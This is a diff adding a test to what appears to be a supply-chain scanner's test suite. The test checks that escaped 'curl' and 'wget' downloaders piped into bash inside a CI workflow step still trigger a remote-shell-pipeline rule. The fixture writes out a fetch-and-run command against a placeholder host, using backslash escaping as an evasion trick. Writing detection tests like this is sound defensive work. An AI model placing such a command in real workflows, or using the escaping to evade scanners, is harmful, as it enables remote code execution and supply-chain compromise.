@@ -1038,3 +1038,12 @@ test('ROOT-8: supply-chain heuristic detects download pipeline after 240 chars',
   assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify({count,result}));
  }
 });
+
+test('Codex P1: escaped curl and wget downloader still trigger remote pipeline heuristics',()=>{
+ for(const downloader of ['c\\url','w\\get']){
+  const src=['on: push','jobs:','  audit:','    steps:',
+   '      - run: '+downloader+' https://example.invalid/payload | bash'].join('\n');
+  const result=scan(src);
+  assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE')||result.status==='INCOMPLETE',JSON.stringify({downloader,result}));
+ }
+});
